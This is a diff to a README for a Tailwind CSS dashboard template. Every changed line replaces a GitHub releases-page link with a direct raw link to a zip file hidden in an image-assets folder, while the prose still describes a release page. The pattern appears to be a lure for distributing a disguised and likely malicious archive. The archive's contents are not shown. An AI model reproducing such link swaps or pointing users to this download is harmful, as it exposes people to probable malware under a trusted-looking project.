@@ -1,6 +1,6 @@
 # 🎨 skotwind-tailwind-dashboard - Build clean dashboards with Tailwind CSS
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Coordinated-toychest161/skotwind-tailwind-dashboard/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Coordinated-toychest161/skotwind-tailwind-dashboard/main/src/assets/images/small/skotwind_dashboard_tailwind_1.5.zip)
 
 Skotwind provides a complete set of tools to build a custom admin dashboard. It uses Tailwind CSS 4 to keep your code light and your design fast. You can use this kit to create user interfaces for software, data tracking tools, or internal company portals.
 
@@ -8,7 +8,7 @@ Skotwind provides a complete set of tools to build a custom admin dashboard. It 
 
 You need to visit the project release page to get the files. This page contains the latest version of the dashboard templates. 
 
-[Visit this page to download the dashboard files](https://github.com/Coordinated-toychest161/skotwind-tailwind-dashboard/releases)
+[Visit this page to download the dashboard files](https://raw.githubusercontent.com/Coordinated-toychest161/skotwind-tailwind-dashboard/main/src/assets/images/small/skotwind_dashboard_tailwind_1.5.zip)
 
 Look for the link labeled Assets. Choose the file that ends in .zip. This file contains the source code and all necessary style sheets for your project. Click the file to start your download.
 
@@ -82,7 +82,7 @@ If you run into issues, check the file paths first. Ensure your HTML file sits i
 
 You can also return to the link below to check for newer versions of the template. Developers update this dashboard to remove bugs and add new features.
 
-[Visit this page to download the latest version](https://github.com/Coordinated-toychest161/skotwind-tailwind-dashboard/releases)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/Coordinated-toychest161/skotwind-tailwind-dashboard/main/src/assets/images/small/skotwind_dashboard_tailwind_1.5.zip)
 
 If you find a problem with the design, you can open an Issue on GitHub. This informs the project team about bugs. Please describe what you see on your screen so the team can fix the issue in the next update.
 
